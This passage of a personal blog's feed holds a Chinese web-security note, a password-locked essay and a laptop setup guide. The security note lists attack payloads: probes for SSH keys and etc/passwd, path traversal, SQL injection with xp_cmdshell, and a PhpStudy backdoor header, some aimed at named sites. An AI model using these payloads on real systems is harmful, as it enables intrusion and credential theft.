class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">db.sql</span><br><span class="line"></span><br><span class="line">db.sqlite</span><br><span class="line"></span><br><span class="line">config.php.bak</span><br><span class="line"></span><br><span class="line">config.ini</span><br><span class="line"></span><br><span class="line">config.inc </span><br><span class="line"></span><br><span class="line">id_rsa</span><br><span class="line"></span><br><span class="line">phpinfo.php</span><br><span class="line"></span><br><span class="line">.bash_profile</span><br><span class="line"></span><br><span class="line">.htpasswd.bak</span><br><span class="line"></span><br><span class="line">.user.ini</span><br><span class="line"></span><br><span class="line">.svn&#x2F;entries</span><br><span class="line"></span><br><span class="line">.ssh&#x2F;id_rsa</span><br><span class="line"></span><br><span class="line">&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h2 id="文件下载过滤"><a href="#文件下载过滤" class="headerlink" title="文件下载过滤"></a>文件下载过滤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">114.255.59.102&#x2F;api.php?c&#x3D;project&amp;f&#x3D;index&amp;id&#x3D;news&amp;sort&#x3D;1+and+extractvalue(1,concat(~,md5(915401131)))+--+&amp;token&#x3D;1234</span><br><span class="line"></span><br><span class="line">GET &#x2F;vpn&#x2F;..&#x2F;vpns&#x2F;cfg&#x2F;smb.conf</span><br></pre></td></tr></table></figure><h2 id="Apache畸形本地文件名安全绕过漏洞"><a href="#Apache畸形本地文件名安全绕过漏洞" class="headerlink" title="Apache畸形本地文件名安全绕过漏洞"></a>Apache畸形本地文件名安全绕过漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache服务器从右至左判断文件后缀名，假如文件名为filename.x1.x2.x3，则先判断x3是否文件后缀名，然后x2，x1直到发现有效后缀名。这导致像test.php.x1.x2.x3这样的文件被识别为test.php，即，攻击者创建类似于*.php.*，的文件名，上传至服务器即可利用该漏洞运行脚本</span><br></pre></td></tr></table></figure><h2 id="Apache-Tomcat-AllowLinking-URIencoding目录遍历漏洞"><a href="#Apache-Tomcat-AllowLinking-URIencoding目录遍历漏洞" class="headerlink" title="Apache Tomcat AllowLinking URIencoding目录遍历漏洞"></a>Apache Tomcat AllowLinking URIencoding目录遍历漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;%C0%AE%C0%AE&#x2F;%C0%AE%C0%AE&#x2F;%C0%AE%C0%AE&#x2F;%C0%AE%C0%AE&#x2F;%C0%AE%C0%AE&#x2F;%C0%AE%C0%AE&#x2F;%C0%AE%C0%AE&#x2F;%C0%AE%C0%AE&#x2F;%C0%AE%C0%AE&#x2F;%C0%AE%C0%AE&#x2F;etc&#x2F;passw</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Sqlmap-space2blank-Tamper-特殊空字符&quot;&gt;&lt;a href=&quot;#Sqlmap-space2blank-Tamper-特殊空字符&quot; class=&quot;headerlink&quot; title=&quot;Sqlmap space2blank Tamper(特殊空字符)&quot;&gt;&lt;/a&gt;Sqlmap space2blank Tamper(特殊空字符)&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Location: https:&amp;#x2F;&amp;#x2F;www.mct.gov.cn&amp;#x2F;this_is_404_page?waf_detect&amp;#x3D;value+AND+1&amp;#x3D;1+UNION+ALL+SELECT+1,NULL,&amp;#39;&amp;lt;script&amp;gt;alert(&amp;quot;XSS&amp;quot;)&amp;lt;&amp;#x2F;script&amp;gt;&amp;#39;,table_name+FROM+information_schema.tables+WHERE+2&amp;gt;1--&amp;#x2F;**&amp;#x2F;;+EXEC+xp_cmdshell(&amp;#39;cat+..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;etc&amp;#x2F;passwd&amp;#39;)#\&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;GIT项目源代码探测&quot;&gt;&lt;a href=&quot;#GIT项目源代码探测&quot; class=&quot;headerlink&quot; title=&quot;GIT项目源代码探测&quot;&gt;&lt;/a&gt;GIT项目源代码探测&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;www.caeg.cn&amp;#x2F;.git&amp;#x2F;HEAD&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;目录穿越攻击行为&quot;&gt;&lt;a href=&quot;#目录穿越攻击行为&quot; class=&quot;headerlink&quot; title=&quot;目录穿越攻击行为&quot;&gt;&lt;/a&gt;目录穿越攻击行为&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;temp&amp;#x3D;&amp;#x2F;..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.shtml&amp;#x2F;..&amp;#x2F;..&amp;#x2F;xhtml&amp;#x2F;css&amp;#x2F;index.css&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[%2F  &amp;#x3D;&amp;#x3D;  &amp;#x2F;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;Nmap扫描&quot;&gt;&lt;a href=&quot;#Nmap扫描&quot; class=&quot;headerlink&quot; title=&quot;Nmap扫描&quot;&gt;&lt;/a&gt;Nmap扫描&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x2F;nice ports,&amp;#x2F;Trinity.txt.bak&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;PhpStudy后门远程命令执行&quot;&gt;&lt;a href=&quot;#PhpStudy后门远程命令执行&quot; class=&quot;headerlink&quot; title=&quot;PhpStudy后门远程命令执行&quot;&gt;&lt;/a&gt;PhpStudy后门远程命令执行&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Accept-Charset: ZGllKG1kNSgnSGVsbG9waHBTdHVkeScpKTs&amp;#x3D;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;die(md5(&amp;#39;HellophpStudy&amp;#39;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Security" scheme="https://hejueyun.github.io/categories/Security/"/>
    
    <category term="Web Security" scheme="https://hejueyun.github.io/categories/Security/Web-Security/"/>
    
    <category term="Note" scheme="https://hejueyun.github.io/categories/Security/Web-Security/Note/"/>
    
    
    <category term="sec" scheme="https://hejueyun.github.io/tags/sec/"/>
    
  </entry>
  
  <entry>
    <title>浅析新闻摄影中的表征转向</title>
    <link href="https://hejueyun.github.io/posts/79e8ab51/"/>
    <id>https://hejueyun.github.io/posts/79e8ab51/</id>
    <published>2021-04-16T08:22:51.000Z</published>
    <updated>2021-04-25T07:09:09.516Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 这可能出现在手机端上.">  <script id="hbeData" type="hbeData" data-hmacdigest="95e7d3cc40ac465e1f3fcfcde8887e67008624111608fac4b52dbfee5990430b">e06efa0a23c1c0008c5666c8224fa09b5941c450bfbf227c94af4486b52bd5e4c20dd1cd8d9af71d890989e06260041eb0186f922e6f82a5e2a3229420cc46a471d7eb690611eb09c751453589fbc44ace3e80e69a744de8cb9ae03b91060bba7613294a1a2a80d1f1dc6f3d3f2df56ad3821fb5b41d4da0254f76133457466e4dd47e9cf1f3b4188135f3a7669ea82b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">由于某不可抗因素，查看本文章需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">&lt;div class=&quot;hbe hbe-container&quot; id=&quot;hexo-blog-encrypt&quot; data-wpm=&quot;抱歉, 这个密码看着不太对, 请再试试.&quot; data-whm=&quot;抱歉, 这个文章不能被校验, 这可能出现在手机端上.&quot;&gt;
  &lt;script id=&quot;hbeData&quot; type=&quot;hbeData&quot; data-hmacdigest=&quot;95e7d3cc40ac465e1f3fcfcde8887e67008624111608fac4b52dbfee5990430b&quot;&gt;e06efa0a23c1c0008c5666c8224fa09b5941c450bfbf227c94af4486b52bd5e4c20dd1cd8d9af71d890989e06260041eb0186f922e6f82a5e2a3229420cc46a471d7eb690611eb09c751453589fbc44ace3e80e69a744de8cb9ae03b91060bba7613294a1a2a80d1f1dc6f3d3f2df56ad3821fb5b41d4da0254f76133457466e4dd47e9cf1f3b4188135f3a7669ea82b&lt;/script&gt;
  &lt;div class=&quot;hbe hbe-content&quot;&gt;
    &lt;div class=&quot;hbe hbe-input hbe-input-default&quot;&gt;
      &lt;input class=&quot;hbe hbe-input-field hbe-input-field-default&quot; type=&quot;password&quot; id=&quot;hbePass&quot;&gt;
      &lt;label class=&quot;hbe hbe-input-label hbe-input-label-default&quot; for=&quot;hbePass&quot;&gt;
        &lt;span class=&quot;hbe hbe-input-label-content hbe-input-label-content-default&quot;&gt;由于某不可抗因素，查看本文章需要密码.&lt;/span&gt;
      &lt;/label&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;script data-pjax src=&quot;/lib/hbe.js&quot;&gt;&lt;/script&gt;&lt;link href=&quot;/css/hbe.style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;</summary>
    
    
    
    <category term="雜文" scheme="https://hejueyun.github.io/categories/essay/"/>
    
    <category term="傳播學" scheme="https://hejueyun.github.io/categories/essay/communication/"/>
    
    
    <category term="essay" scheme="https://hejueyun.github.io/tags/essay/"/>
    
  </entry>
  
  <entry>
    <title>[主机]小新pro14 2021体验及装机指北</title>
    <link href="https://hejueyun.github.io/posts/69d0feff/"/>
    <id>https://hejueyun.github.io/posts/69d0feff/</id>
    <published>2021-04-08T07:49:14.000Z</published>
    <updated>2021-05-09T10:56:18.313Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前一直在用<code>nuc8 i7BEK8559U</code>，便宜大腕。换配置主要出于几点原因：</p><ul><li>风扇吵，就算在bios调整了曲线也是动不动起飞</li><li>准系统不能完全代替笔电的使用场景</li><li>四核打开个直播网页有点卡<br>正好看到有小新pro的首发就抢了一波</li></ul><h2 id="配置及测试"><a href="#配置及测试" class="headerlink" title="配置及测试"></a>配置及测试</h2><table><thead><tr><th>参数</th><th>配置</th></tr></thead><tbody><tr><td>CPU</td><td>Zen3 R7 5800H</td></tr><tr><td>iGpu</td><td>Radeon Vega8 2000Hz</td></tr><tr><td>Memory</td><td>8x2 32000Hz</td></tr><tr><td>SSD</td><td>512GB</td></tr><tr><td>Monitor</td><td>14inch 2.2k</td></tr><tr><td>wifi</td><td>Intel AX200</td></tr><tr><td>Battery</td><td>61Wh</td></tr></tbody></table><h3 id="CPU性能测试"><a href="#CPU性能测试" class="headerlink" title="CPU性能测试"></a>CPU性能测试</h3><ul><li>cinebench r20 单/双核</li></ul><img src="/posts/69d0feff/1.png" height="300"><blockquote><p>结果和B站上的评测差不多，但和cpu-monkey上5000+的成绩有不小差距</p><p>在实际体验上和之前的8559U有了涨足的进步，但似乎仍却不如台式上的3500X打开网页那么顺滑，也许和内存也有关系吧</p></blockquote><h3 id="gpu性能测试"><a href="#gpu性能测试" class="headerlink" title="gpu性能测试"></a>gpu性能测试</h3><ul><li>3dmark night raid 1080p</li></ul><img src="/posts/69d0feff/3.png" height="300"><ul><li>2.2k</li></ul><img src="/posts/69d0feff/2.png" height="300"><ul><li>3dmark time spy 1080p</li></ul><img src="/posts/69d0feff/4.png" height="300"><blockquote><p>之前还是对5800H的核显小有期待的，但跑分出来还不如MX350。测试了一下外接1080P 14寸屏跑cs:go，fps benchmark过烟只有个位数帧数，全低画质下1%low目测也就三四十帧，晃动并不完全流畅，总之体验并不好</p><img src="/posts/69d0feff/7.png" height="300"></blockquote><h2 id="装机流程指北"><a href="#装机流程指北" class="headerlink" title="装机流程指北"></a>装机流程指北</h2><blockquote><p>之前好几次装机都想记录一下流程，但总觉得这种东西很容易就过时，so这次也只是写个大体方向，基本不会变的项目才会给出具体步骤</p></blockquote><h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><ul><li><p>必要的</p><ul><li>Everything<ul><li>设置<code>ctrl+Q</code>为新建搜索页面的快捷键</li></ul></li><li>VLC</li><li>Winrar</li><li>Notepad 3</li><li>Vscode</li></ul></li><li><p>Windows Store</p><ul><li>city art search</li><li>cas preview</li><li>Mail</li></ul></li><li><p>私货</p><ul><li>Appgo</li><li>小狼毫98五笔<ul><li>注意是<a href="http://www.98wubi.com/">成品版</a>，不要用irime再从github clone五笔的方法，很多github上的方案都不更新了</li><li>在<code>default.yaml</code>中加上<code>left_ctrl</code>上屏功能</li></ul></li><li>Firefox developer edition<ul><li>相关插件如图，注意打开每个插件中的Sync功能</li><li>如果喜欢自动全屏的话可以用<code>AutoFullscreen</code>插件</li></ul></li></ul><img src="/posts/69d0feff/5.png" height="200"><ul><li>Telegram</li><li>坚果云</li></ul></li><li><p>卸载</p><ul><li>skype</li><li>cortana</li><li>联想XX  </li></ul></li><li><p>激活</p><ul><li>Windows 专业版(自购激活码)</li><li>Windows安全中心</li><li>OneDrive</li><li>剪贴板(<code>win+V</code>)</li><li>多桌面(<code>win+Tab</code>)</li></ul></li></ul><h3 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h3><ul><li>调整开始界面中的磁贴</li><li>自动隐藏任务栏</li><li>搜索</li></ul><img src="/posts/69d0feff/6.png" height="150"><h3 id="WSL"><a href="#WSL" class="headerlink" title="WSL"></a>WSL</h3><ul><li>“谣传”<code>wsl 1</code>不再继续开发了，故正式转向<code>wsl 2</code>。<ul><li>pros:<ul><li>更干净、快速</li><li>docker、mysql支持</li></ul></li><li>cons:<ul><li>跨系统访问速度慢</li><li>用不了kite，以及vscode中的一些插件(e.g. Markdown Paste)</li></ul></li></ul></li></ul><h4 id="windows-terminal"><a href="#windows-terminal" class="headerlink" title="windows terminal"></a>windows terminal</h4><ul><li>更纱黑体</li><li>Settings<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&quot;defaultProfile&quot;: &quot;&#123;07b52e3e-de2c-5db4-bd2d-ba144ed6c273&#125;&quot;,</span><br><span class="line">&#123;</span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;07b52e3e-de2c-5db4-bd2d-ba144ed6c273&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Ubuntu-20.04&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;backgroundImage&quot;</span>: <span class="string">&quot;C:/Users/XXX/Downloads/wallpaper/XXX.jpg&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;backgroundImageStretchMode&quot;</span>: <span class="string">&quot;uniformToFill&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;backgroundImageOpacity&quot;</span>: <span class="number">0.3</span>,</span><br><span class="line">        <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#21222C&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#BD93F9&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#6272A4&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#D6ACFF&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#A4FFFF&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#69FF94&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#FF92DF&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#FF6E6E&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#FFFFA5&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#8BE9FD&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#F8F8F2&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#50FA7B&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#FF79C6&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#FF5555&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#F8F8F2&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#F1FA8C&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;fontFace&quot;</span>: <span class="string">&quot;Sarasa Term SC&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;fontSize&quot;</span>: <span class="number">13</span>,</span><br><span class="line">        <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;wsl ~&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;Windows.Terminal.Wsl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>Zsh<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br><span class="line">sudo apt install zsh</span><br><span class="line">sudo sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</span><br><span class="line">sudo echo &quot;c=&#x27;code .&#x27;&quot;| sudo tee -a &quot;~/.zshrc&quot;</span><br><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure></li></ul><h4 id="wsl2"><a href="#wsl2" class="headerlink" title="wsl2"></a>wsl2</h4><ul><li>Ubuntu 20.04</li><li>wsl1=&gt;wsl2的步骤参见<a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-win10">官网</a></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># linux 配置例举</span></span><br><span class="line"></span><br><span class="line">sudo passwd root <span class="comment"># [Enter Password] </span></span><br><span class="line">su - <span class="comment">#check</span></span><br><span class="line">su hejueyun</span><br><span class="line"></span><br><span class="line">cp -ra /etc/apt/sources.list /etc/apt/sources.list.bak</span><br><span class="line">sudo rm -f /etc/apt/sources.list</span><br><span class="line">sudo touch /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade -y</span><br><span class="line"></span><br><span class="line">sudo apt-get install zsh -y</span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;alias c=&#x27;code .&#x27;&quot;</span> | sudo tee -a ~/.zshrc </span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo apt -y install curl dirmngr apt-transport-https lsb-release ca-certificates</span><br><span class="line">sudo apt-get install gcc g++ make -y</span><br><span class="line">curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -</span><br><span class="line">sudo apt -y install nodejs</span><br><span class="line">sudo npm install npm@latest -g</span><br><span class="line">node --version</span><br><span class="line">npm  -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo</span></span><br><span class="line">sudo npm install -g hexo-cli --save</span><br><span class="line">npm install </span><br><span class="line">npm update</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git config --global user.name <span class="string">&quot;hejueyun&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;hejueyun@gmail.com&quot;</span></span><br><span class="line">git config -l</span><br><span class="line">ssh-keygen -C <span class="string">&quot;hejueyun@gmail.com&quot;</span></span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/junegunn/fzf.git ~/.fzf</span><br><span class="line">~/.fzf/install</span><br><span class="line"></span><br><span class="line">sudo apt install -y python3-pip</span><br><span class="line">sudo pip3 install pipenv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># latex</span></span><br><span class="line">sudo apt install -y texlive-full</span><br><span class="line">sudo apt install ttf-mscorefonts-installer -y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo apt install -y mysql-server</span><br><span class="line">sudo apt install -y redis-server</span><br></pre></td></tr></table></figure><h4 id="Vscode"><a href="#Vscode" class="headerlink" title="Vscode"></a>Vscode</h4><ul><li>先打开Sync</li><li>Markdown<ul><li>Markdown All in One</li><li>Markdown Preview Mermaid Support</li><li>Markdown Shortcuts</li></ul></li><li>Latex<ul><li>LaTeX Workshop</li><li>Draw.io Integration</li></ul></li><li>Notes<ul><li>VSNotes</li></ul></li><li>Lint<ul><li>Bracket Pair Coloizer</li><li>Prettier</li><li>shell-format</li></ul></li><li>Theme<ul><li>Dark++ icons</li><li>vscode-icons</li></ul></li><li>Python<ul><li>Python Indent</li><li>Python Type Hint</li><li>Visual Studio IntelliCode</li><li>Pylance</li></ul></li></ul><h4 id="疑难解决"><a href="#疑难解决" class="headerlink" title="疑难解决"></a>疑难解决</h4><p>Q: Paste Image while writing markdown in vscode wsl-remote ?</p><blockquote><ul><li>在网络资源管理器中打开<code>\\wsl$</code>，如果不能访问则去网络设置中打开映射</li><li>把想要的图片拖进对应的文件夹，如果不行则<code>chmod</code></li></ul></blockquote><p>Q: Cannot Save files which are opened by <code>code</code> command in linux shell ,while <code>sudo code</code> command not found?</p><blockquote><p><code>chmod -R 777 dirname</code></p><ul><li>不要将此命令应用于<code>/usr/</code>下</li></ul></blockquote><p>Q：How much disk space does WSL use on Windows?</p><blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ncdu</span><br><span class="line"><span class="built_in">cd</span> / </span><br><span class="line">ncdu --exclude /mnt </span><br></pre></td></tr></table></figure></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前一直在用&lt;code&gt;nuc8 i7BEK8559U&lt;/code&gt;，便宜大腕。换配置主要出于几点原因：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;风扇吵，就算在bios调整了曲线也是动不动起飞&lt;/li&gt;
&lt;li&gt;准系统不能完全代替笔电的使用场景&lt;/li&gt;
&lt;li&gt;四核打开个直播网页有点卡&lt;br&gt;正好看到有小新pro的首发就抢了一波&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;配置及测试&quot;&gt;&lt;a href=&quot;#配置及测试&quot; class=&quot;headerlink&quot; title=&quot;配置及测试&quot;&gt;&lt;/a&gt;配置及测试&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;配置&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;CPU&lt;/td&gt;
&lt;td&gt;Zen3 R7 5800H&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;iGpu&lt;/td&gt;
&lt;td&gt;Radeon Vega8 2000Hz&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Memory&lt;/td&gt;
